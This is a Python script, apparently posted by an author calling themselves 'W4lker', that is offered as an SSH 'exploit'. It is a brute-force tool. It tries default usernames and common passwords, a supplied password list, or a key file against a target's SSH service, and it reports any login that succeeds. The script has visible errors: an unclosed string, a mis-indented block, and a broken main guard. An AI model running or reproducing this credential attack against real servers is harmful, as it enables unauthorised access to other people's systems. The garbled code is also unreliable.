import argparse
import os
import paramiko
from termcolor import colored

def main():
    parser = argparse.ArgumentParser(description='EXPLOIT SSH, DOCUMENTATION CREATED BY W4lker)
    parser.add_argument('-t', '--target', type=str, help="Specify the target's IP address")
    parser.add_argument('-d', '--doc', action='store_true', help="Display documentation")
    parser.add_argument('-b', '--bruteforce', action='store_true', help="Perform a brute-force attack")
    parser.add_argument('-u', '--user', type=str, help="Specify the target username")
    parser.add_argument('-p', '--passwordlist', type=str, help="Specify the path to the passwordlist file")
    parser.add_argument('-e', '--exploit', action='store_true', help="Execute the exploit function")
    
    print("Usage Examples:")
    print("1. Display documentation:")
    print("   python EXPLOIT_SSH.py -d")
    print("2. Perform a brute-force attack using default usernames and passwords:")
    print("   python EXPLOIT_SSH.py -t 127.0.0.1 -b")
    print("3. Perform a brute-force attack using a custom username and password list:")
    print("   python EXPLOIT_SSH.py -t 127.0.0.1 -b -u myusername -p mypasswordlist.txt")
    print("4. Execute the exploit function:")
    print("   python EXPLOIT_SSH.py -t 127.0.0.1 -e")


    args = parser.parse_args()

    target = args.target
    doc = args.doc
    bruteforce = args.bruteforce
    username = args.user
    passwordlist = args.passwordlist
    execute_exploit = args.exploit

    if doc:
        organization(args)

    if bruteforce:
        if username:
            brute_force(target, username=username, passwordlist=passwordlist)
        else:
            brute_force(target, passwordlist=passwordlist)

    if execute_exploit:
        exploit(target)

def organization(args):
    target = args.target
    exploit(target)

def exploit(target):
    usernames = ['admin', 'root', 'user']
    passwords = ['password', 'admin', '123456', 'qwerty', 'letmein', 'password123']
    methods = ['password', 'key']

    for username in usernames:
        for password in passwords:
            try:
                ssh_client = paramiko.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh_client.connect(target, username=username, password=password)
                print(colored(f"Successful login - Username: {username}, Password: {password}", 'green'))
                ssh_client.close()
                return
            except paramiko.AuthenticationException:
                print(colored(f"Failed login - Username: {username}, Password: {password}", 'red'))
            except paramiko.SSHException as e:
                print(colored(f"SSH error: {str(e)}", 'red'))
            except Exception as e:
                print(colored(f"Error: {str(e)}", 'red'))

    for username in usernames:
        for method in methods:
            try:
                ssh_client = paramiko.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh_client.connect(target, username=username, key_filename='id_rsa')
                print(colored(f"Successful login - Username: {username}, Method: {method}", 'green'))
                ssh_client.close()
                return
            except paramiko.AuthenticationException:
                print(colored(f"Failed login - Username: {username}, Method: {method}", 'red'))
            except paramiko.SSHException as e:
                print(colored(f"SSH error: {str(e)}", 'red'))
            except Exception as e:
                print(colored(f"Error: {str(e)}", 'red'))

    print(colored("Exploit failed - Unable to find valid credentials", 'yellow'))

def brute_force(target, username=None, passwordlist=None):
    if username:
        usernames = [username]
    else:
        usernames = ['admin', 'root', 'user']

if passwordlist:
        with open(passwordlist, 'r') as file:
            passwords = file.read().splitlines()
    else:
        passwords = ['password', 'admin', '123456', 'qwerty', 'letmein', 'password123']

    methods = ['password', 'key']

    for username in usernames:
        for password in passwords:
            try:
                ssh_client = paramiko.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh_client.connect(target, username=username, password=password)
                print(colored(f"Successful login - Username: {username}, Password: {password}", 'green'))
                ssh_client.close()
                return
            except paramiko.AuthenticationException:
                print(colored(f"Failed login - Username: {username}, Password: {password}", 'red'))
            except paramiko.SSHException as e:
                print(colored(f"SSH error: {str(e)}", 'red'))
            except Exception as e:
                print(colored(f"Error: {str(e)}", 'red'))

if name == "main":
    main()